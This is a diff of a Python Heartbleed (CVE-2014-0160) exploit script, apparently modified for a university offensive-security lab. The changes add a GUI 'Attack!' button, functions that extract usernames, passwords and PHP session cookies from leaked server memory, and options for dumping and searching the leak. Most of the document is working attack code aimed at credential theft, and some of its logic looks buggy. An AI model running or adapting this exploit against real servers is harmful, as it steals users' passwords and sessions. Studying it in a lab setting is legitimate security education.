@@ -1,14 +1,11 @@
 #!/usr/bin/python
-# coding=utf-8
 
-# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
+# Quick demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
 # The author disclaims copyright to this source code
 # Minor customizations by Malik Mesellem (@MME_IT)
 # New options added for the course Lab on Offensive Computer Security TU/e (2019):
 #   - Claudiu Ion (TU/e)
-#   - Léon van de Beek (TU/e)
-#
-#
+#   - Leon van de Beek (TU/e)
 
 import sys
 import struct
@@ -18,8 +15,6 @@ import select
 import re
 from Tkinter import *
 from optparse import OptionParser
-
-
 
 class colors:
     HEADER = '\033[95m'
@@ -34,6 +29,12 @@ class colors:
 options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
 options.add_option('-p', '--port', type='int', default=8443, help='TCP port to test (default: 8443)')
 options.add_option('-n', '--num', type='int', default=1, help='Number of times to connect/loop (default: 1)')
+options.add_option('-f', '--file', type='str', default='', help='Name of the file in which to dump the output (default: output.txt)')
+options.add_option('-v', '--verbose', default=False, help='Run exploit script and dump all output to console; does not skip empty lines (default: false)', action='store_true')
+options.add_option('-q', '--quiet', default=False, help='Run exploit script without dumping output to the console (default: false)', action='store_true')
+options.add_option('-c', '--cookie', default=False, help='Detect whether exploit returned any cookies (default: false)', action='store_true')
+options.add_option('-w', '--pwd', default=False, help='Detect whether exploit returned any passwords (default: false)', action='store_true')
+options.add_option('-k', '--key', type='str', default='', help='Input key to extract from server dump (default: empty)')
 
 def h2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
@@ -70,13 +71,98 @@ hb = h2bin('''
 #              The total length of a HeartbeatMessage MUST NOT exceed 2^14
 #              example: FF FF (= 65535 bytes) thus we will received 4 paquets of length 16384 bytes
 
-def hexdump(s):
+
+def logList(list, name, color, delim = ''):
+    # Build message string
+    # Use delim to detect whether we are printing cookies (cookies are printed on separate lines)
+    if delim == '\n':
+        header = color + name + colors.END + ': '
+        msg = ''
+    else:
+        header = ''
+        msg = color + name + colors.END + ': '
+
+    for item in list:
+        msg += header + item + ' ' + delim
+
+    print(msg)
+
+def skip(info, pos, stop):
+    while stop.find(info[pos]) == -1:
+        pos += 1
+    return pos
+
+# method extracts usernames, passwords and session ids (cookies) from leaked info
+def getCredentials(info, key):
+    items = []
+    i = info.index(key)
+    while i < len(info):
+        # Find next user from info string
+        i = skip(info, i, '=')
+        # Strip current user from info string
+        info = info[i+1:]
+        # Get username of current user (and add to users list)
+        i = skip(info, 0, '&.;')
+        items.append(info[:i])
+        output.insert('end', info[:i] + "\n")
+        # Strip current username from info string
+        info = info[i+1:]
+        i = len(info)
+        if info.find(key) != -1:
+            i = info.index(key)
+    return items
+
+def hexdump(s, key, verbose):
+
+    file = FILE_text.get()
+
+    # Open output file (if specified by user)
+    if len(file) > 0:
+        status.set(colors.OKGREEN + 'DONE: ' + colors.END + 'memory dump was saved in output file.\n')
+        output = open(file, 'a')
+
+    # Variables for detecting passwords and cookies in memory dump
+    hasPwd = False;
+    hasCookie = False;
+    info = ''
+
     for b in xrange(0, len(s), 16):
         lin = [c for c in s[b : b + 16]]
         hxdat = ' '.join('%02X' % ord(c) for c in lin)
         pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
-        status.set('  %04x: %-48s %s' % (b, hxdat, pdat))
-    print
+
+        info += pdat
+
+        # Skip printing empty lines (lines that do not decode to useful information
+        # If verbose option specified by user empty lines are printed
+        _temp = pdat.replace('.','')
+        if len(_temp) > 0 or verbose:
+            if len(file) > 0:
+                output.write('  %04x: %-48s %s\n' % (b, hxdat, pdat))
+            else:
+                status.set('  %04x: %-48s %s' % (b, hxdat, pdat))
+
+    # Detect whether passwords or cookies are present in the leaked memory
+    if pdat.find('pas'):
+        hasPwd = True
+    if pdat.find('Cookie'):
+        hasCookie = True
+
+    # Get user names from leaked memory
+    users = getCredentials(info, 'login')
+    # Get user passwords from leaked memory
+    passwords = getCredentials(info, 'password')
+    # Get user cookie from leaked memory
+    cookies = getCredentials(info, 'PHPSESSID')
+    # Search for key provided by user (if any)
+    query = []
+    if len(key) > 0:
+        query = getCredentials(info, key)
+
+    if len(file) == 0 and not quiet:
+        print
+
+    return users, passwords, cookies, query, hasPwd, hasCookie
 
 def recvall(s, length, timeout=5):
     endtime = time.time() + timeout
@@ -89,7 +175,6 @@ def recvall(s, length, timeout=5):
         r, w, e = select.select([s], [], [], 5)
         if s in r:
             data = s.recv(remain)
-            # EOF?
             if not data:
                 return None
             rdata += data
@@ -107,47 +192,83 @@ def recvmsg(s):
     if pay is None:
         status.set('Unexpected EOF receiving record payload - server closed connection')
         return None, None, None
-    #status.set(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
-
+    _tmp = ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
+    status.set(_tmp)
     return typ, ver, pay
 
-def hit_hb(s):
+def hit_hb(s, file, pwd, cookie, key, verbose):
     s.send(hb)
     while True:
         typ, ver, pay = recvmsg(s)
         if typ is None:
-            status.set('No heartbeat response received, server likely not vulnerable')
+            status.set(colors.FAIL + 'ERROR: ' + colors.END + 'no heartbeat response received, server likely not vulnerable')
             return False
 
         if typ == 24:
             status.set('Received heartbeat response:')
-            hexdump(pay)
+            # Parse information from heartbeat response
+            users, passwords, cookies, query, hasPwd, hasCookie = hexdump(pay, file, key, verbose)
+
+            # Log to console the list of users
+            logList(users[1:], 'USERS', colors.OKBLUE)
+            # Log to console the list of passwords
+            logList(passwords, 'PASSWORDS', colors.OKBLUE)
+            # Log to console the list of cookies
+            logList(cookies, 'COOKIE', colors.OKBLUE, '\n')
+
+            # If user specified a key, then log search results
+            if len(key) > 0:
+                if len(query) > 0:
+                    logList(query, 'QUERY (key)', colors.HEADER, '\n')
+                else:
+                    status.set(colors.HEADER + 'QUERY (key): ' + colors.END + 'no results\n')
+
+            if hasCookie and cookie:
+                status.set(colors.HEADER + 'COOKIE: ' + colors.END + 'server returned cookies - check output')
+            if hasPwd and pwd:
+                status.set(colors.HEADER + 'PASSWORD: ' + colors.END + 'server returned passwords - check output')
+
             if len(pay) > 3:
-                status.set(colors.WARNING + 'WARNING' + colors.END + ': server returned more data than it should - server is vulnerable!')
+                status.set(colors.WARNING + 'WARNING: ' + colors.END + 'server returned more data than it should - server is vulnerable!')
             else:
-                status.set('Server processed malformed heartbeat, but did not return any extra data.')
+                status.set(colors.FAIL + 'ERROR: ' + colors.END + 'server processed malformed heartbeat, but did not return any extra data.')
+
             return True
 
         if typ == 21:
             status.set('Received alert:')
-            hexdump(pay)
-            status.set('Server returned error, likely not vulnerable')
+            hexdump(pay, file, key, verbose)
+            status.set(colors.FAIL + 'ERROR: ' + colors.END + 'server returned error, likely not vulnerable')
             return False
 
 def execute():
+    e1.config(state = 'disabled')
+    e2.config(state = 'disabled')
+    e3.config(state = 'disabled')
+    e4.config(state = 'disabled')
+    e5.config(state = 'disabled')
+    output.config(state = 'normal')
+
     IP = IP_text.get()
     PORT = PORT_text.get()
     TIMES = TIMES_text.get()
+    FILE = FILE_text.get()
+    KEY = KEY_text.get()
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
     status.set('Connecting...')
+    updatescreen()
     sys.stdout.flush()
-    #s.connect((IP, PORT))
+    s.connect((IP, PORT))
+
     status.set('Sending Client Hello...')
     sys.stdout.flush()
     s.send(hello)
+
     status.set('Waiting for Server Hello...')
     sys.stdout.flush()
+
     while True:
         typ, ver, pay = recvmsg(s)
         if typ == None:
@@ -158,10 +279,13 @@ def execute():
             break
 
     for i in range(TIMES):
-      status.set('Sending heartbeat request #' + str(i+1) + '!')
+      _tmp = 'Sending heartbeat request #' + str(i+1) + '!'
+      status.set(_tmp)
       sys.stdout.flush()
       s.send(hb)
-      hit_hb(s)
+      hit_hb(s, FILE, opts.pwd, opts.cookie, KEY, opts.verbose)
+
+# ****************  GUI starts here *******************
 
 window = Tk()
 separator = Frame(height=2, bd=1)
@@ -208,6 +332,9 @@ l3.grid(row = 3, column = 1)
 l4 = Label(topframe, text = "Select output file name: ")
 l4.grid(row = 4, column = 1)
 
+l5 = Label(topframe, text = "Insert additional keyword (optional): ")
+l5.grid(row = 5, column = 1)
+
 IP_text = StringVar()
 IP_text.set("192.168.1.101")
 e1 = Entry(topframe, textvariable = IP_text)
@@ -228,11 +355,16 @@ FILE_text.set("output.txt")
 e4 = Entry(topframe, textvariable = FILE_text)
 e4.grid(row = 4, column = 3)
 
+KEY_text = StringVar()
+KEY_text.set("")
+e5 = Entry(topframe, textvariable = KEY_text)
+e5.grid(row = 5, column = 3)
+
 sep = Label(topframe)
-sep.grid(row = 5, column = 3)
+sep.grid(row = 6, column = 3)
 
 b1 = Button(topframe, text = "Attack!", command = execute)
-b1.grid(row = 6, column = 3)
+b1.grid(row = 7, column = 3)
 
 status = StringVar()
 status.set("Press Start button to start the attack.")
@@ -241,6 +373,7 @@ statusbar.pack(side = BOTTOM, fill = X)
 
 output = Text(middleframe, width = 80, height = 10)
 output.insert('end', 'Output will appear here.')
+output.config(state = 'disabled')
 output.pack()
 
 def updatescreen():
